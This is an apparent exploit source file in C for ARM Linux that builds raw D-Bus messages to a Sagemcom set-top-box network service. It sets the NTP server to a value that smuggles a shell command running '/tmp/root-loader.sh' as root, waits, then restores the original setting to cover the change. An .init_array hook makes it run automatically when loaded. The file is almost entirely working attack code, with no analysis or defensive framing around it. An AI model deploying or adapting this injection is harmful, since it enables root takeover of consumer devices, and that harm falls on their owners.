typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

void *memcpy(void *dst,const void *src,unsigned int n){
 u8*d=dst;const u8*s=src;while(n--)*d++=*s++;return dst;
}

static long sc(long n,long a,long b,long c){
 register long r7 __asm__("r7")=n,r0 __asm__("r0")=a,r1 __asm__("r1")=b,r2 __asm__("r2")=c;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2):"memory"); return r0;
}
static u32 slen(const char*s){u32 n=0;while(s[n])n++;return n;}
static void cp(u8*b,u32*p,const void*s,u32 n){const u8*q=s;while(n--)b[(*p)++]=*q++;}
static void zpad(u8*b,u32*p,u32 a){while((*p)&(a-1))b[(*p)++]=0;}
static void put32(u8*b,u32*p,u32 v){b[(*p)++]=v;b[(*p)++]=v>>8;b[(*p)++]=v>>16;b[(*p)++]=v>>24;}
static void set32(u8*b,u32 p,u32 v){b[p]=v;b[p+1]=v>>8;b[p+2]=v>>16;b[p+3]=v>>24;}
static u32 get32(const u8*b,u32 p){return (u32)b[p]|((u32)b[p+1]<<8)|((u32)b[p+2]<<16)|((u32)b[p+3]<<24);}
static void field_s(u8*b,u32*p,u8 code,char type,const char*s){
 zpad(b,p,8);b[(*p)++]=code;b[(*p)++]=1;b[(*p)++]=type;b[(*p)++]=0;
 zpad(b,p,4);u32 n=slen(s);put32(b,p,n);cp(b,p,s,n);b[(*p)++]=0;
}
static void field_g(u8*b,u32*p,const char*s){
 zpad(b,p,8);b[(*p)++]=8;b[(*p)++]=1;b[(*p)++]='g';b[(*p)++]=0;
 u32 n=slen(s);b[(*p)++]=n;cp(b,p,s,n);b[(*p)++]=0;
}
static u32 begin(u8*b,u8 type,u32 serial){u32 p=0;b[p++]='l';b[p++]=type;b[p++]=0;b[p++]=1;put32(b,&p,0);put32(b,&p,serial);put32(b,&p,0);return p;}
static u32 hello(u8*b){u32 p=begin(b,1,1);field_s(b,&p,1,'o',"/org/freedesktop/DBus");field_s(b,&p,2,'s',"org.freedesktop.DBus");field_s(b,&p,3,'s',"Hello");field_s(b,&p,6,'s',"org.freedesktop.DBus");u32 h=p;zpad(b,&p,8);set32(b,12,h-16);return p;}
static u32 request_name(u8*b){u32 p=begin(b,1,2);field_s(b,&p,1,'o',"/org/freedesktop/DBus");field_s(b,&p,2,'s',"org.freedesktop.DBus");field_s(b,&p,3,'s',"RequestName");field_s(b,&p,6,'s',"org.freedesktop.DBus");field_g(b,&p,"su");u32 h=p;zpad(b,&p,8);u32 body=p;const char*n="sc.netflix.ntp_probe";put32(b,&p,slen(n));cp(b,&p,n,slen(n));b[p++]=0;zpad(b,&p,4);put32(b,&p,0);set32(b,12,h-16);set32(b,4,p-body);return p;}
static void dict_u(u8*b,u32*p,const char*k,u32 v){zpad(b,p,8);put32(b,p,slen(k));cp(b,p,k,slen(k));b[(*p)++]=0;b[(*p)++]=1;b[(*p)++]='u';b[(*p)++]=0;zpad(b,p,4);put32(b,p,v);}
static void dict_s(u8*b,u32*p,const char*k,const char*v){zpad(b,p,8);put32(b,p,slen(k));cp(b,p,k,slen(k));b[(*p)++]=0;b[(*p)++]=1;b[(*p)++]='s';b[(*p)++]=0;zpad(b,p,4);put32(b,p,slen(v));cp(b,p,v,slen(v));b[(*p)++]=0;}
static u32 set_ntp(u8*b,u32 serial,const char*server){
 u32 p=begin(b,1,serial);field_s(b,&p,1,'o',"/com/sagemcom/stb/network");field_s(b,&p,2,'s',"com.sagemcom.stb.network");field_s(b,&p,3,'s',"NTP_SetConfig");field_s(b,&p,6,'s',"com.sagemcom.stb.network");field_g(b,&p,"ua{sv}");u32 h=p;zpad(b,&p,8);u32 body=p;put32(b,&p,1);u32 alen=p;put32(b,&p,0);zpad(b,&p,8);u32 astart=p;dict_u(b,&p,"Id",1);dict_u(b,&p,"Enable",1);dict_u(b,&p,"Config",0);dict_s(b,&p,"Server",server);set32(b,alen,p-astart);set32(b,12,h-16);set32(b,4,p-body);return p;
}
static void lognum(char tag,long v){char x[16];u32 p=0;x[p++]=tag;x[p++]='=';for(int i=7;i>=0;i--){u8 n=(v>>(i*4))&15;x[p++]=n<10?'0'+n:'a'+n-10;}x[p++]='\n';long f=sc(5,(long)"/tmp/scnet_probe.log",0x441,0666);if(f>=0){sc(19,f,0,2);sc(4,f,(long)x,p);sc(6,f,0,0);}}
static long transact(long s,u8*b,u8*r,u32 n,char tag){long q=sc(4,s,(long)b,n);lognum(tag,q);q=sc(3,s,(long)r,4096);lognum(tag+1,q);if(q>=16){lognum(tag+2,r[1]);lognum(tag+3,get32(r,4));long f=sc(5,(long)"/tmp/scnet_reply.bin",0x441,0666);if(f>=0){sc(19,f,0,2);sc(4,f,(long)r,q);sc(6,f,0,0);}}return q;}
static void run(void){
 static u8 b[4096],r[4096];struct{u16 family;char path[108];}a={1,"/tmp/sc_bus/sc_bus"};
 long s=sc(281,1,1,0);lognum('s',s);if(s<0)return;long q=sc(283,s,(long)&a,2+slen(a.path)+1);lognum('c',q);if(q<0)return;
 static const char auth[]="\0AUTH EXTERNAL 31303037\r\n";sc(4,s,(long)auth,sizeof(auth)-1);q=sc(3,s,(long)r,sizeof(r));lognum('a',q);static const char bm[]="BEGIN\r\n";sc(4,s,(long)bm,sizeof(bm)-1);
 u32 n=hello(b);transact(s,b,r,n,'h');
 n=set_ntp(b,2,"ntp1.vodafone.co.nz;umask 022;/bin/ash /tmp/root-loader.sh >/tmp/root-loader.log 2>&1;#");transact(s,b,r,n,'p');
 struct{u32 sec,nsec;}ts={5,0};sc(162,(long)&ts,0,0);
 n=set_ntp(b,3,"ntp1.vodafone.co.nz");transact(s,b,r,n,'r');sc(6,s,0,0);
}
__attribute__((section(".init_array"),used))static void(*init_entry)(void)=run;
void _start(void){run();sc(1,0,0,0);}
